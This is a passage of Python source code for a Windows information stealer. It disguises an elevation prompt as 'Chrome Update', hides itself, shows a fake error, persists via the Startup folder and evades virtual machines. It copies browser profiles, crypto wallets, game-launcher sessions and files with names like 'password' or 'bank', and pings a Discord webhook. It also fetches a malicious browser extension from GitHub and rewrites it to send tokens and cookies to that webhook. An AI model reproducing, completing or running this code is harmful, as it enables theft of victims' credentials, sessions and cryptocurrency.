            ""Comodo Dragon"": f""{self.programdata}\\Microsoft\\Windows\\Start Menu\\Programs\\Comodo Dragon.lnk"",
            ""Opera Neon"": f""{self.programdata}\\Microsoft\\Windows\\Start Menu\\Programs\\Opera Neon.lnk""
        }
        self.path_shortcutnav_additionnal = {
            ""Opera GX"": f""{self.roaming}\\Microsoft\\Windows\\Start Menu\\Programs\\Navigateur Opera GX.lnk"",
        }
        self.filezilla_config_path = os.path.join(self.roaming, ""FileZilla"")
        self.recentservers_xml_path = os.path.join(self.filezilla_config_path, ""recentservers.xml"")
        self.sitemanager_xml_path = os.path.join(self.filezilla_config_path, ""sitemanager.xml"")



    def ask_admin(self):
        if self.find_in_config(""chromenject_config"") != ""yes"":
            return
        try:
            if shell32.IsUserAnAdmin() == 0:
                if shell32.ShellExecuteW(None, ""runas"", sys.executable, __file__, None, 1, 'Chrome Update') <= 32:
                    raise Exception(""Error permissions"")
                time.sleep(1)
                if self.hide == ""yes"":
                    hide = win32gui.GetForegroundWindow()
                    win32gui.ShowWindow(hide, win32con.SW_HIDE)
        except:
            pass
        

    def thiefcat_DoAFakeError(self: str) -> str:
        if self.fake_error != ""yes"":
            return
        try:
            ctypes.windll.user32.MessageBoxW(None,
                ""Error code: Windows_0x786542\nSomething gone wrong."",
                ""Fatal Error"",
                0,
            )
        except:
            pass

    def ping_on_running(self: str) -> str:
        if self.pingonrun != ""yes"":
            return
        try:
            ping1 = {
                ""username"": f""{NotKSCH58} "",
                ""avatar_url"": f""https://cdn.discordapp.com/attachments/1205938154234843228/1205938170609274930/logo.png?ex=65da3071&is=65c7bb71&hm=e2a43d7c2a3a91937f0b260ff6228e9d6afe65dda9b88dfefcb6940e3dac894a&"",
                ""content"": ""@everyone"",
            }
            ping2 = {
                ""username"": f""{NotKSCH58} "",
                ""avatar_url"": f""https://cdn.discordapp.com/attachments/1205938154234843228/1205938170609274930/logo.png?ex=65da3071&is=65c7bb71&hm=e2a43d7c2a3a91937f0b260ff6228e9d6afe65dda9b88dfefcb6940e3dac894a&"",
                ""content"": ""@here"",
            }
            if self.webapi_find in self.thishawk_webh:
                if self.pingtype in [""@everyone"", ""everyone""]:
                    httpx.post(self.thishawk_webh, json=ping1)
                elif self.pingtype in [""@here"", ""here""]:
                    httpx.post(self.thishawk_webh, json=ping2)
        except:
            pass

    def thiefcat_AddStartup(self: str) -> str:
        if self.startupexe != ""yes"":
            return
        try:
            startup_path = os.path.join(roaming, ""Microsoft"", ""Windows"", ""Start Menu"", ""Programs"", ""Startup"")
            src_file = argv[0]
            dest_file = os.path.join(startup_path, os.path.basename(src_file))
            if os.path.exists(dest_file):
                os.remove(dest_file)
            shutil.copy2(src_file, dest_file)
        except:
            pass

    def thread_bind(self):
        if self.bindoption == """" or self.bindoption == ""%Bind""+ ""_Options%"":
            return
        try:
            if hasattr(sys, ""frozen""):
                file_path = os.path.abspath(__file__)
                current_directory = os.path.dirname(file_path)
                bound_file_path = os.path.join(current_directory,"".'"", self.bindoption)
                temp_dir = temp
                bound_file_destination = os.path.join(temp_dir, self.bindoption)
                try:
                    if not os.path.isfile(bound_file_destination):
                        shutil.copy(bound_file_path, bound_file_destination)
                    try:
                        Popen(f""start {self.bindoption}"", shell=True, cwd=temp_dir, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
                    except:
                        Popen(f""start {bound_file_path}"", shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
                        pass 
                except Exception as e:
                    pass
            else:
                pass
        except:
            pass
        
    def thiefcat_HideYourself(self):
        if self.hide != ""yes"":
            return
        try:
            hwnd = win32gui.GetForegroundWindow()
            win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
            current_pid = win32api.GetCurrentProcessId()
            current_process_handle = win32api.OpenProcess(win32con.PROCESS_ALL_ACCESS, False, current_pid)
            if current_process_handle:
                try:
                    win32process.SetPriorityClass(current_process_handle, win32process.BELOW_NORMAL_PRIORITY_CLASS)
                except:
                    pass
        except:
            pass

    def thiefcat_ProcessStop(self):
        shutil.rmtree(self.dir, ignore_errors=True)
        os._exit(0)

    def extract_try(func):
        def wrapper(*args, **kwargs):
            try:
                func(*args, **kwargs)
            except Exception:
                pass
        return wrapper

    def getlange(self, pc_code) -> str:
        try:
            lang_map = {
                ""fr_FR"": ""FR_"",
                ""ar_SA"": ""AR_"",
                ""bg_BG"": ""BU_"",
                ""ca_ES"": ""CA_"",
                ""zh_TW"": ""CH_"",
                ""cs_CZ"": ""CZ_"",
                ""da_DK"": ""DA_"",
                ""de_DE"": ""GE_"",
                ""el_GR"": ""GR_"",
                ""en_US"": ""US_"",
                ""en_SG"": ""EN_"",
                ""es_ES"": ""SP_"",
                ""fi_FI"": ""FIN_"",
                ""he_IL"": ""HEB_"",
                ""hu_HU"": ""HUN_"",
                ""is_IS"": ""ICE_"",
                ""it_IT"": ""IT_"",
                ""ko_KR"": ""KO_"",
                ""nl_NL"": ""DU_"",
                ""nb_NO"": ""NORW_"",
                ""pl_PL"": ""POL_"",
                ""pt_BR"": ""BR_"",
                ""rm_CH"": ""RH_RO_"",
                ""ro_RO"": ""ROM_"",
                ""en_SE"": ""SWE_"",
                ""ru_RU"": ""RU_"",
                ""en_150"": ""DEU_"",
                ""hr_HR"": ""CRO_"",
                ""en_DE"": ""DEU_"",
                ""sk_SK"": ""SLOV_"",
                ""sq_AL"": ""ALB_"",
                ""sv_SE"": ""SWE_"",
                ""tr_TR"": ""TURK_"",
                ""ur_PK"": ""UR_PAK_"",
                ""id_ID"": ""IND_"",
                ""uk_UA"": ""UKR_"",
                ""be_BY"": ""BELA_RU_"",
                ""sl_SI"": ""SLOVE_"",
                ""et_EE"": ""EST_"",
                ""lv_LV"": ""LATV_"",
                ""lt_LT"": ""LITH_"",
                ""tg_Cyrl_TJ"": ""TAJIK_"",
                ""fa_IR"": ""PERS_"",
                ""vi_VN"": ""VIET_"",
                ""hy_AM"": ""ARM_"",
                ""az_Latn_AZ"": ""AZERI_"",
                ""eu_ES"": ""BASQUE_"",
                ""wen_DE"": ""SORB_"",
                ""mk_MK"": ""MACE_"",
                ""st_ZA"": ""SUTU_"",
                ""ts_ZA"": ""TSO_"",
                ""tn_ZA"": ""TSA_"",
                ""ven_ZA"": ""VEND_"",
                ""xh_ZA"": ""XH_"",
                ""zu_ZA"": ""ZU_"",
                ""af_ZA"": ""AFR_"",
                ""ka_GE"": ""GEO_"",
                ""fo_FO"": ""FARO_"",
                ""hi_IN"": ""HINDI_"",
                ""mt_MT"": ""MAL_"",
                ""se_NO"": ""SAMI_"",
                ""gd_GB"": ""GAELIC_"",
                ""yi"": ""YI_"",
                ""ms_MY"": ""MALAY_"",
                ""kk_KZ"": ""KAZAKH_"",
                ""ky_KG"": ""CYR_"",
                ""bs_Latn_BA"": ""BOSNIAN_"",
                ""sr_Cyrl_RS"": ""SERB_"",
                ""sr_Latn_RS"": ""SERBLAT_"",
                ""bs_BA"": ""BOS_"",
                ""iu_Cans_CA"": ""IUK_"",
                ""sk_SK"": ""SLOV_"",
                ""en_US"": ""EN_"",
                ""am_ET"": ""AMH_"",
                ""tmz"": ""TMZ_"",
                ""ks_Arab_IN"": ""KSH_"",
                ""ne_NP"": ""NEP_"",
                ""fy_NL"": ""FRS_"",
                ""ps_AF"": ""PAS_"",
                ""fil_PH"": ""FIL_"",
                ""dv_MV"": ""DIV_"",
                ""bin_NG"": ""BEN_"",
                ""fuv_NG"": ""FUL_"",
                ""ha_Latn_NG"": ""HAU_"",
                ""ibb_NG"": ""IBO_"",
                ""yo_NG"": ""YOR_"",
                ""quz_BO"": ""QUB_"",
                ""nso_ZA"": ""NSO_"",
                ""ig_NG"": ""IBO_"",
                ""kr_NG"": ""KAN_"",
                ""gaz_ET"": ""ORO_"",
                ""ti_ER"": ""TIR_"",
                ""gn_PY"": ""GRN_"",
                ""haw_US"": ""HAW_"",
                ""la"": ""LAT_"",
                ""so_SO"": ""SOM_"",
                ""ii_CN"": ""III_"",
                ""pap_AN"": ""PAP_"",
                ""ug_Arab_CN"": ""UIG_"",
                ""mi_NZ"": ""MRI_"",
                ""ar_IQ"": ""ARA_"",
                ""zh_CN"": ""ZHO_"",
                ""de_CH"": ""DEU_"",
                ""es_MX"": ""SPA_"",
                ""fr_BE"": ""FRA_"",
                ""it_CH"": ""ITA_"",
                ""nl_BE"": ""NLD_"",
                ""nn_NO"": ""NNO_"",
                ""pt_PT"": ""POR_"",
                ""ro_MD"": ""RON_"",
                ""ru_MD"": ""RUS_"",
                ""sr_Latn_CS"": ""SRP_"",
                ""sv_FI"": ""SVE_"",
                ""ur_IN"": ""URD_"",
                ""az_Cyrl_AZ"": ""AZE_"",
                ""ga_IE"": ""GLE_"",
                ""ms_BN"": ""MAL_"",
                ""uz_Cyrl_UZ"": ""UZB_"",
                ""bn_BD"": ""BEN_"",
                ""pa_PK"": ""PAN_"",
                ""mn_Mong_CN"": ""MON_"",
                ""bo_BT"": ""BOD_"",
                ""sd_PK"": ""SND_"",
                ""tzm_Latn_DZ"": ""TZN_"",
                ""ks_Deva_IN"": ""KSH_"",
                ""ne_IN"": ""NEP_"",
                ""quz_EC"": ""QUE_"",
                ""ti_ET"": ""TIR_"",
                ""ar_EG"": ""ARA_"",
                ""zh_HK"": ""ZHO_"",
                ""de_AT"": ""DEU_"",
                ""en_AU"": ""ENG_"",
                ""fr_CA"": ""FR_"",
                ""sr_Cyrl_CS"": ""SRB_"",
                ""quz_PE"": ""QUE_"",
                ""ar_LY"": ""ARA_"",
                ""zh_SG"": ""CHN_"",
                ""de_LU"": ""GER_"",
                ""en_CA"": ""ENG_"",
                ""es_GT"": ""SPA_"",
                ""fr_CH"": ""FR_"",
                ""hr_BA"": ""HRV_"",
                ""ar_DZ"": ""ARA_"",
                ""zh_MO"": ""CHN_"",
                ""de_LI"": ""GER_"",
                ""th_TH"": ""TH_"",
                ""en_GB"": ""EN_"",
                ""ja_JP"": ""JAP_""
            }
            return lang_map.get(pc_code, ""KS_"")
        except:
            return ""KS_""

    async def init(self):
        self.browsers = {
            ""amigo"": self.appdata + ""\\Amigo\\User Data"",
            ""torch"": self.appdata + ""\\Torch\\User Data"",
            ""kometa"": self.appdata + ""\\Kometa\\User Data"",
            ""orbitum"": self.appdata + ""\\Orbitum\\User Data"",
            ""cent-browser"": self.appdata + ""\\CentBrowser\\User Data"",
            ""7star"": self.appdata + ""\\7Star\\7Star\\User Data"",
            ""sputnik"": self.appdata + ""\\Sputnik\\Sputnik\\User Data"",
            ""vivaldi"": self.appdata + ""\\Vivaldi\\User Data"",
            ""google-chrome-sxs"": self.appdata + ""\\Google\\Chrome SxS\\User Data"",
            ""google-chrome"": self.appdata + ""\\Google\\Chrome\\User Data"",
            ""epic-privacy-browser"": self.appdata + ""\\Epic Privacy Browser\\User Data"",
            ""microsoft-edge"": self.appdata + ""\\Microsoft\\Edge\\User Data"",
            ""uran"": self.appdata + ""\\uCozMedia\\Uran\\User Data"",
            ""yandex"": self.appdata + ""\\Yandex\\YandexBrowser\\User Data"",
            ""brave"": self.appdata + ""\\BraveSoftware\\Brave-Browser\\User Data"",
            ""iridium"": self.appdata + ""\\Iridium\\User Data"",
            ""edge"": self.appdata + ""\\Microsoft\\Edge\\User Data"",
            ""operaneon"": self.roaming +  ""\\Opera Software\\Opera Neon\\User Data"",
            ""operastable"": self.roaming + ""\\Opera Software\\Opera Stable"",
            ""operagx"": self.roaming + ""\\Opera Software\\Opera GX Stable"",
        }
        self.profiles = [
            ""Default"",
            ""Profile 1"",
            ""Profile 2"",
            ""Profile 3"",
            ""Profile 4"",
            ""Profile 5"",
        ]

        #### ALL FUNC
        if self.thishawk_webh == """" or self.thishawk_webh == ""\x57EBHOOK_HERE"":
            self.thiefcat_ProcessStop()
        binder = threading.Thread(target=self.thread_bind)
        binder.start()
        self.thiefcat_HideYourself()
        self.ask_admin()
        self.thiefcat_DisableDefender()
        self.thiefcat_DoAFakeError()
        self.thiefcat_AddStartup()

        if self.find_in_config(""SAEZRTYRES1"") and AntiDebugg().inVM is True:
            self.thiefcat_ProcessStop()
        if self.find_in_config(""AEZRETRYY5"") == ""yes"":
            await self.thiefcat_BypassBetterDsc()
            await self.thiefcat_BypassTokenProtector()

        function_list = [
            self.thiefcat_TakeScreenshot,
            self.thiefcat_TakeCamera,
            self.thiefcat_GetWifi,
            self.thiefcat_GetClipboard,
            self.thiefcat_GetAllUSB,
            self.thiefcat_GetAntiVirus,
            self.thiefcat_GetSysInfo,
            self.thiefcat_GetToken,
            self.thiefcat_GetFilezilla,
            self.thiefcat_GetMinecraft,
            self.thiefcat_GetRoblox,
            self.thiefcat_GetGrowTopia,
            self.thiefcat_GetSensitive,
            self.thiefcat_GetSteam,
            self.thiefcat_GetWallet,
            self.thiefcat_GetUbisoft,
            self.thiefcat_GetEpicGame,
            self.thiefcat_TelegramSessions,
            self.detect_browsers,
            self.ping_on_running,
            self.soundlilvoice

        ]

        if self.find_in_config(""killdiscord_config"") is True:
            await self.kill_process_id()
        if self.Found_Browsers == ""yes"":
            os.makedirs(os.path.join(self.dir, ""Browsers""), exist_ok=True)
        for name, path in self.browsers.items():
            if not os.path.isdir(path):
                continue
            self.masterkey = self.mykey_gtm(path + ""\\Local State"")
            self.funcs = [
                self.thiefcat_browsers1,
                self.thiefcat_browsers2,
                self.thiefcat_browsers3,
                self.thiefcat_browsers4,
                self.thiefcat_browsers5,
            ]

            try:
                t = threading.Thread(target=self.firefox())
                t.start()
            except:
                pass
            for profile in self.profiles:
                for func in self.funcs:
                    try:
                        func(name, path, profile)
                    except:
                        pass
                    try:
                        func(name, path)
                    except:
                        pass
        if os.path.exists(self.chrome_user_path) and self.chrome_key is not None:
            os.makedirs(os.path.join(self.dir, ""Google""), exist_ok=True)
            function_list.extend([self.thiefcat_GetGoogle1, self.thiefcat_GetGoogle2, self.thiefcat_GetGoogle3])
        for func in function_list:
            process = threading.Thread(target=func, daemon=True)
            process.start()
        for t in threading.enumerate():
            try:
                t.join()
            except RuntimeError:
                continue
            
        self.install_extension()
        self.natify_matched_tokens()
        await self.finished_bc()
        self.injection_discord()
        
        
    def kill_process(self, process_name):
        for proc in psutil.process_iter():
            try:
                if proc.name() == process_name:
                    proc.kill()
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                pass

    def thiefcat_GetWallet(self):
        if self.Found_Crypto != ""yes"":
            return
        try:
            directory = os.path.join(self.dir, ""Wallets"")
            dir_wall = {
            ""Zcash"": os.path.join(roaming, ""Zcash""),
            ""Armory"": os.path.join(roaming, ""Armory""),
            ""Bytecoin"": os.path.join(roaming, ""Bytecoin""),
            ""Jaxx"": os.path.join(roaming, ""com.liberty.jaxx"", ""IndexedDB"", ""file_0.indexeddb.leveldb""),
            ""Exodus"": os.path.join(roaming, ""Exodus"", ""exodus.wallet""),
            ""Ethereum"": os.path.join(roaming, ""Ethereum"", ""keystore""),
            ""Electrum"": os.path.join(roaming, ""Electrum"", ""wallets""),
            ""AtomicWallet"": os.path.join(roaming, ""atomic"", ""Local Storage"", ""leveldb""),
            ""Guarda"": os.path.join(roaming, ""Guarda"", ""Local Storage"", ""leveldb""),
            ""Coinomi"": os.path.join(local, ""Coinomi"", ""Coinomi"", ""wallets""),
            }

            path_check = {
                    ""Brave"" : os.path.join(local, ""BraveSoftware"", ""Brave-Browser"", ""User Data""),
                    ""Chrome"" : os.path.join(local, ""Google"", ""Chrome"", ""User Data""),
                    ""Chromium"" : os.path.join(local, ""Chromium"", ""User Data""),
                    ""Comodo"" : os.path.join(local, ""Comodo"", ""Dragon"", ""User Data""),
                    ""Edge"" : os.path.join(local, ""Microsoft"", ""Edge"", ""User Data""),
                    ""EpicPrivacy"" : os.path.join(local, ""Epic Privacy Browser"", ""User Data""),
                    ""Iridium"" : os.path.join(local, ""Iridium"", ""User Data""),
                    ""Opera"" : os.path.join(roaming, ""Opera Software"", ""Opera Stable""),
                    ""Opera GX"" : os.path.join(roaming, ""Opera Software"", ""Opera GX Stable""),
                    ""Slimjet"" : os.path.join(local, ""Slimjet"", ""User Data""),
                    ""UR"" : os.path.join(local, ""UR Browser"", ""User Data""),
                    ""Vivaldi"" : os.path.join(local, ""Vivaldi"", ""User Data""),
                    ""Yandex"" : os.path.join(local, ""Yandex"", ""YandexBrowser"", ""User Data"")
                }

            for name, path in dir_wall.items():
                if os.path.isdir(path):
                    cryptowall_directory = os.path.join(directory, name)
                    os.makedirs(cryptowall_directory, exist_ok=True)
                    try:
                        shutil.copytree(path, os.path.join(cryptowall_directory, os.path.basename(path)), dirs_exist_ok=True)
                    except Exception:
                        pass

            for name, path in path_check.items():
                if os.path.isdir(path):
                    for root, dirs, _ in os.walk(path):
                        if ""Local Extension Settings"" in dirs:
                            extension_browsers_dir = os.path.join(root, ""Local Extension Settings"")
                            for ext_dir in inp2, inp1, inp3, inp4, inp5, inp6, inp7, inp8, inp9, inp10, inp11, inp12, inp13, inp14, inp15, inp16, inp17, inp18, inp19, inp20, inp21:
                                extension_dir = os.path.join(extension_browsers_dir, ext_dir)
                                if os.path.isdir(extension_dir) and os.listdir(extension_dir):
                                    if ext_dir in local_identifier:
                                        found = ""{} - {}"".format(local_identifier[ext_dir], name)
                                        directory_wall = os.path.join(directory, found)
                                        _directory = os.path.join(directory_wall, ext_dir)
                                        try:
                                            shutil.copytree(extension_dir, _directory, dirs_exist_ok=True)
                                        except Exception as e:
                                            pass
                                        else:
                                            if not os.listdir(directory_wall):
                                                shutil.rmtree(directory_wall)
        except:
            pass

    def thiefcat_GetSensitive(self):
        try:
            keywords = [
                ""passw"",
                ""mdp"",
                ""motdepasse"",
                ""mot_de_"" + ""passe"",
                ""login"",
                ""secret"",
                ""acc"" + ""ount"",
                ""acount"",
                ""paypal"",
                ""banque"",
                ""met"" + ""amask"",
                ""wal"" + ""let"",
                ""crypto"",
                ""exodus"",
                ""2fa"",
                ""code"",
                ""memo"",
                ""compte"",
                ""token"",
                ""backup"",
                ""finance"",
                ""seecret"",
                ""bank"",
                ""credit"",
            ]
            directories = [""Desktop"", ""Downloads"", ""Documents"", ""Pictures"", ""Videos"", ""Music""]
            max_file_size = 4 * 1024 * 2048  # 2 MB
            max_files = 8
            excluded_extensions = ["".xml"", "".cc"", "".h"", "".md"", "".yml"", "".mem"", "".md"", "".js"", "".py"", "".css"", "".html"", "".jre"", "".c"", "".cs"", "".cpp"", "".ps1"", "".mjs"", "".ejs"", "".map"", "".ts"", ""cmd"", "".json""]
            user_home = os.path.expanduser(""~"")

            found_files = 0

            for directory in directories:
                path = os.path.join(user_home, directory)
                if os.path.exists(path):
                    for file in os.listdir(path):
                        file_path = os.path.join(path, file)
                        dest_directory = os.path.join(self.dir, ""Sensitive"")
                        if os.path.isfile(file_path) and os.path.getsize(file_path) <= max_file_size and not any(file.lower().endswith(ext) for ext in excluded_extensions):
                            for keyword in keywords:
                                if keyword in file.lower():
                                    if not os.path.exists(dest_directory):
                                        os.makedirs(dest_directory, exist_ok=True)
                                    shutil.copy2(file_path, dest_directory)
                                    found_files += 1
                                    if found_files >= max_files:
                                        return

        except Exception as e:
            pass

    def thiefcat_GetSteam(self):
        if self.launcher != ""yes"":
            return
        try:
            directory = os.path.join(self.dir, ""Launcher"", ""Steam"")
            steam_found = ""C:\\Program Files (x86)\\Steam""
            config_found = os.path.join(steam_found, ""config"")
            login_file = os.path.join(config_found, ""loginusers.vdf"")
            if os.path.isdir(config_found) and os.path.isfile(login_file):
                with open(login_file) as file:
                    files_contents = file.read()
                    if '""RememberPassword""\t\t""1""' in files_contents:
                        try:
                            os.makedirs(directory, exist_ok=True)
                            shutil.copytree(config_found, os.path.join(directory, ""config""), dirs_exist_ok=True)
                            for files in os.listdir(steam_found):
                                if files.startswith(""ssfn"") and os.path.isfile(os.path.join(steam_found, files)):
                                    shutil.copy(os.path.join(steam_found, files), os.path.join(directory, files))
                        except Exception:
                            pass
        except:
            pass

    def thiefcat_GetGrowTopia(self):
        if self.Found_Game != ""yes"":
            return
        try:
            growtopia = os.path.join(local, ""Growtopia"", ""save.dat"")
            directory = os.path.join(self.dir, ""Games"", ""Growtopia"")
            os.makedirs(directory, exist_ok=True)
            shutil.copy(growtopia, os.path.join(directory, ""save.dat""))
        except:
            pass
        

    def thiefcat_GetEpicGame(self):
        if self.launcher != ""yes"":
            return
        try:
            directory = os.path.join(self.dir, ""Launcher"", ""Epic"")
            epicgame = os.path.join(local, ""EpicGamesLauncher"", ""Saved"", ""Config"", ""Windows"")
            config_file = os.path.join(epicgame, ""GameUserSettings.ini"")
            if os.path.isdir(epicgame) and os.path.isfile(config_file):
                with open(config_file) as file:
                    contents = file.read()
                if ""[RememberMe]"" in contents:
                    try:
                        os.makedirs(directory, exist_ok=True)
                        for file in os.listdir(epicgame):
                            if os.path.isfile(os.path.join(epicgame, file)):
                                shutil.copy(os.path.join(epicgame, file), os.path.join(directory, file))
                        shutil.copytree(epicgame, directory, dirs_exist_ok=True)
                    except Exception:
                        pass
        except:
            pass
    
    def thiefcat_GetUbisoft(self):
        if self.launcher != ""yes"":
            return
        try:
            directory = os.path.join(self.dir, ""Launcher"", ""Ubisoft"")
            ubisoft = os.path.join(local, ""Ubisoft Game Launcher"")
            if os.path.isdir(ubisoft):
                files = [file for file in os.listdir(ubisoft) if os.path.isfile(os.path.join(ubisoft, file))]
                if files:
                    os.makedirs(directory, exist_ok=True)
                    for file in files:
                        shutil.copy(os.path.join(ubisoft, file), os.path.join(directory, file))
        except:
            pass
            
    def detect_browsers(self):
        try:
            browser_executables = [
                os.path.join(os.environ.get('LOCALAPPDATA'), 'Programs', 'Opera', 'launcher.exe'),
                os.path.join(os.environ.get('PROGRAMFILES'), 'Opera', 'launcher.exe'),
                os.path.join(os.environ.get('PROGRAMFILES(X86)'), 'Opera', 'launcher.exe'),

                os.path.join(os.environ.get('PROGRAMFILES'), 'Opera GX', 'launcher.exe'),
                os.path.join(os.environ.get('LOCALAPPDATA'), 'Programs', 'Opera GX', 'launcher.exe'),
                os.path.join(os.environ.get('PROGRAMFILES(X86)'), 'Opera GX', 'launcher.exe'),

                os.path.join(os.environ.get('PROGRAMFILES'), 'Opera Neon', 'launcher.exe'),
                os.path.join(os.environ.get('LOCALAPPDATA'), 'Programs', 'Opera Neon', 'launcher.exe'),
                os.path.join(os.environ.get('PROGRAMFILES(X86)'), 'Opera Neon', 'launcher.exe'),

                os.path.join(os.environ.get('LOCALAPPDATA'), 'Programs', 'BraveSoftware', 'Brave-Browser', 'Application', 'brave.exe'),
                os.path.join(os.environ.get('PROGRAMFILES'), 'BraveSoftware', 'Brave-Browser', 'Application', 'brave.exe'),
                os.path.join(os.environ.get('PROGRAMFILES(X86)'), 'BraveSoftware', 'Brave-Browser', 'Application', 'brave.exe'),

                os.path.join(os.environ.get('LOCALAPPDATA'), 'Google', 'Chrome', 'Application', 'chrome.exe'),
                os.path.join(os.environ.get('PROGRAMFILES'), 'Google', 'Chrome', 'Application', 'chrome.exe'),
                os.path.join(os.environ.get('PROGRAMFILES(X86)'), 'Google', 'Chrome', 'Application', 'chrome.exe'),

                os.path.join(os.environ.get('PROGRAMFILES'), 'Vivaldi', 'Application', 'vivaldi.exe'),
                os.path.join(os.environ.get('LOCALAPPDATA'), 'Programs', 'Vivaldi', 'Application', 'vivaldi.exe'),
                os.path.join(os.environ.get('PROGRAMFILES(X86)'), 'Vivaldi', 'Application', 'Vivaldi.exe'),

                os.path.join(os.environ.get('LOCALAPPDATA'), 'Microsoft', 'Edge', 'Application', 'msedge.exe'),
                os.path.join(os.environ.get('PROGRAMFILES'), 'Microsoft', 'Edge', 'Application', 'msedge.exe'),
                os.path.join(os.environ.get('PROGRAMFILES(X86)'), 'Microsoft', 'Edge', 'Application', 'msedge.exe'),

                os.path.join(os.environ.get('LOCALAPPDATA'), 'Yandex', 'YandexBrowser', 'Application','browser.exe'),
                os.path.join(os.environ.get('PROGRAMFILES'), 'Yandex', 'YandexBrowser', 'Application','browser.exe'),
                os.path.join(os.environ.get('PROGRAMFILES(X86)'), 'Yandex', 'YandexBrowser', 'Application','browser.exe'),

                os.path.join(os.environ.get('LOCALAPPDATA'), 'Yandex', 'YandexBrowserBeta', 'Application','browser.exe'),
                os.path.join(os.environ.get('PROGRAMFILES'), 'Yandex', 'YandexBrowserBeta', 'Application','browser.exe'),
                os.path.join(os.environ.get('PROGRAMFILES(X86)'), 'Yandex', 'YandexBrowserBeta', 'Application','browser.exe'),

                os.path.join(os.environ.get('LOCALAPPDATA'), 'Yandex', 'YandexBrowserDev', 'Application','browser.exe'),
                os.path.join(os.environ.get('PROGRAMFILES'), 'Yandex', 'YandexBrowserDev', 'Application','browser.exe'),
                os.path.join(os.environ.get('PROGRAMFILES(X86)'), 'Yandex', 'YandexBrowserDev', 'Application','browser.exe'),

                os.path.join(os.environ.get('LOCALAPPDATA'), 'SRWare Iron', 'iron.exe'),
                os.path.join(os.environ.get('PROGRAMFILES'), 'SRWare Iron', 'iron.exe'),
                os.path.join(os.environ.get('PROGRAMFILES(X86)'), 'SRWare Iron', 'iron.exe'),

                os.path.join(os.environ.get('LOCALAPPDATA'), 'Kiwi', 'kiwi.exe'),
                os.path.join(os.environ.get('PROGRAMFILES'), 'Kiwi', 'kiwi.exe'),
                os.path.join(os.environ.get('PROGRAMFILES(X86)'), 'Kiwi', 'kiwi.exe'),

                os.path.join(os.environ.get('LOCALAPPDATA'), 'Torch', 'Application', 'torch.exe'),
                os.path.join(os.environ.get('PROGRAMFILES'), 'Torch', 'Application', 'torch.exe'),
                os.path.join(os.environ.get('PROGRAMFILES(X86)'), 'Torch', 'Application', 'torch.exe'),

                os.path.join(os.environ.get('LOCALAPPDATA'), 'Slimjet', 'slimjet.exe'),
                os.path.join(os.environ.get('PROGRAMFILES'), 'Slimjet', 'slimjet.exe'),
                os.path.join(os.environ.get('PROGRAMFILES(X86)'), 'Slimjet', 'slimjet.exe'),

                os.path.join(os.environ.get('LOCALAPPDATA'), 'Comodo', 'Dragon', 'dragon.exe'),
                os.path.join(os.environ.get('PROGRAMFILES'), 'Comodo', 'Dragon', 'dragon.exe'),
                os.path.join(os.environ.get('PROGRAMFILES(X86)'), 'Comodo', 'Dragon', 'dragon.exe')
            ]
            for browser_executable in browser_executables:
                if os.path.exists(browser_executable):
                    if 'Opera GX' in browser_executable:
                        self.operagx = True
                    elif 'Opera' in browser_executable:
                        self.opera = True
                    elif 'Brave' in browser_executable:
                        self.brave = True
                    elif 'Chrome' in browser_executable:
                        self.chrome = True
                    elif 'vivaldi' in browser_executable.lower():
                        self.vivaldi = True
                    elif 'msedge' in browser_executable.lower():
                        self.edge = True
                    elif 'yandex' in browser_executable.lower():
                        self.yandex = True
                    elif 'iron' in browser_executable.lower():
                        self.iron = True
                    elif 'kiwi' in browser_executable.lower():
                        self.kiwi = True
                    elif 'Torch' in browser_executable.lower():
                        self.torch = True
                    elif 'Slimjet' in browser_executable.lower():
                        self.slimjet = True
                    elif 'Dragon' in browser_executable.lower():
                        self.dragon = True
                    elif 'Opera Neon' in browser_executable.lower():
                        self.operaneon = True
        except:
            pass

    def install_extension(self):
        if self.find_in_config(""chromenject_config"") != ""yes"":
            return
        try:
            for browser, process_name in self.browser_processes.items():
                if process_name in (p.name() for p in psutil.process_iter()):
                    self.kill_process(process_name)

           #Modified by xTyzenIV And le_chat_blanc999      
            extensions = {
                'extensions': f'https://github.com/Inplex-sys/Hawkish-Eyes-NoDualHook/blob/main/extensions.zip'
            }
            for extension_name, github_repo in extensions.items():
                extensions_path = os.path.join(self.programdata, 'GoogleChromeExtensions')
                extension_path = os.path.join(self.programdata, 'GoogleChromeExtensions', extension_name)
                response = requests.get(github_repo)
                zip_path = os.path.join(os.path.abspath(os.path.dirname(__file__)), f'{extension_name}.zip')
            with open(zip_path, 'wb') as f:
                f.write(response.content)
            with zipfile.ZipFile(zip_path, 'r') as zip_ref:
                zip_ref.extractall(extension_path)
                time.sleep(1)
                main_file = os.path.join(extension_path, ""extension-tokens"", 'js', 'background.js')
                main_file2 = os.path.join(extension_path, ""extension-cookies"", 'scripts', 'background.js')

                with open(main_file, 'r') as f:
                    filedata = f.read()
                    if self.apilink != ""%\u200BAPI_LINK%"" and self.apilink != """" and self.apilink != "" "":
                        newdata = filedata.replace('%API_URL%', self.apilink)
                    else:
                        newdata = filedata.replace('%WEBHOOK%', self.thishawk_webh)
                with open(main_file, 'w') as f:
                    f.write(newdata)
                    f.close()
                with open(main_file2, 'r') as f:
                    filedata = f.read()
                    if self.apilink != ""%\u200BAPI_LINK%"" and self.apilink != """" and self.apilink != "" "":
                        newdata = filedata.replace('%API_URL%', self.apilink)
                    else:
                        newdata = filedata.replace('%WEBHOOK%', self.thishawk_webh)
                with open(main_file2, 'w') as f:
                    f.write(newdata)
                    f.close()
            os.remove(zip_path)
            if shell32.IsUserAnAdmin() == 0:
                    pass
            else:
                try:        

                    for shortcut_name in ['Google Chrome', 'Opera', 'Opera GX', 'Opera Neon', 'Comodo Dragon', 'Slimjet', 'Torch Browser', 'Brave', 'Vivaldi', 'Microsoft Edge', 'Yandex Browser', 'SRWare Iron', 'Kiwi Browser']:
                        shortcut_path = self.path_shortcutnav_roaming.get(shortcut_name)
                        if shortcut_path:
                            if (shortcut_name == 'Google Chrome' and self.chrome) or \
                                    (shortcut_name == 'Opera' and self.opera) or \
                                    (shortcut_name == 'Opera GX' and self.operagx) or \
                                    (shortcut_name == 'Brave' and self.brave) or \
                                    (shortcut_name == 'Vivaldi' and self.vivaldi) or \
                                    (shortcut_name == 'Microsoft Edge' and self.edge) or \
                                    (shortcut_name == 'Yandex Browser' and self.yandex) or \
